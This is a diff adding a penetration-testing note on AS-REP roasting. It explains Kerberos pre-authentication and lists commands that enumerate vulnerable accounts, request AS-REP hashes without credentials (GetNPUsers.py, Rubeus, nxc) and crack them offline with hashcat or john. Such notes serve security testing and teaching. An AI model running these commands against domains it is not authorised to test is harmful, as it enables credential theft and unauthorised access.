@@ -1,0 +1,106 @@
+# AS-REP Roasting
+
+Kerberos pre-authentication forces a client to prove they know the user's password before the KDC issues a TGT. When pre-auth is disabled (`UF_DONT_REQUIRE_PREAUTH`), the KDC returns an AS-REP encrypted with the user's hash to anyone who asks: no credentials required to grab it.
+
+## How It Works
+
+Normal pre-authentication flow:
+
+```
+1. Client → KDC: "I'm Alice" + encrypted timestamp (AS-REQ)
+                  timestamp encrypted with Alice's NTLM hash
+2. KDC decrypts timestamp → verifies identity → issues TGT (AS-REP)
+```
+
+The encrypted timestamp proves you know the password before the KDC gives you anything.
+
+When pre-auth is disabled:
+
+```
+anyone → KDC: "I'm Alice" (no proof needed)
+KDC → anyone: here's Alice's AS-REP, encrypted with Alice's hash
+→ crack offline → plaintext password
+```
+
+No credentials needed to perform the attack: completely unauthenticated if you have a username list.
+
+## Why It Works
+
+- The AS-REP contains a blob encrypted with RC4-HMAC derived from the account's password
+- Without pre-auth, the KDC does not verify the requestor's identity
+- You only need to know the username: useful in unauthenticated scenarios when you have a user list
+- Hash mode 18200 in hashcat
+
+## Finding Vulnerable Accounts
+
+Search for accounts with `UF_DONT_REQUIRE_PREAUTH` (UAC flag `0x400000`) set.
+
+```powershell
+# PowerView
+Get-DomainUser -UACFilter DONT_REQ_PREAUTH | Select-Object samaccountname, description
+
+# LDAP filter (raw)
+Get-ADUser -Filter * -Properties UserAccountControl |
+  Where-Object { $_.UserAccountControl -band 0x400000 } |
+  Select-Object Name, SamAccountName
+```
+
+```bash
+# nxc: with creds
+nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt
+
+# nxc: null session (if LDAP anonymous bind is allowed)
+nxc ldap $DC_IP -u '' -p '' -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt
+```
+
+## Requesting Hashes
+
+Get the AS-REP blob and save it for offline cracking. Works with or without valid credentials.
+
+```bash
+# Without credentials: requires a username list
+GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt -format hashcat -outputfile hashes.txt
+
+# With credentials: discovers accounts automatically
+GetNPUsers.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request -format hashcat -outputfile hashes.txt
+
+# Request for a specific account
+GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile single_user.txt -format hashcat
+```
+
+```powershell
+# Rubeus: all AS-REP roastable accounts
+Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
+
+# Rubeus: specific account
+Rubeus.exe asreproast /user:$TARGET /format:hashcat /outfile:hashes.txt
+
+# Rubeus: unauthenticated
+Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt /domain:$DOMAIN /dc:$DC_IP
+```
+
+## Cracking
+
+```bash
+# hashcat mode 18200
+hashcat -m 18200 hashes.txt ~/tools/wordlists/rockyou
+
+# With rules for mangled passwords
+hashcat -m 18200 hashes.txt ~/tools/wordlists/rockyou -r /usr/share/hashcat/rules/best64.rule
+
+# john
+john hashes.txt --wordlist=~/tools/wordlists/rockyou
+```
+
+## Clock Skew (faketime)
+
+Kerberos requires your clock to be within 5 minutes of the DC. If you get `KRB_AP_ERR_SKEW`, use `faketime` to offset your system time for the duration of the command without actually changing your clock.
+
+```bash
+# Run any command with a time offset
+faketime -f '+7h' GetNPUsers.py $DOMAIN/ -dc-ip $DC_IP -no-pass -usersfile users.txt -format hashcat -outputfile hashes.txt
+faketime -f '+7h' nxc ldap $DC_IP -u $USER -p $PASSWORD -d $DOMAIN --dns-server $DC_IP --asreproast hashes.txt
+
+# Negative offset (your clock is ahead of the DC)
+faketime -f '-3h' GetNPUsers.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -request -format hashcat -outputfile hashes.txt
+```
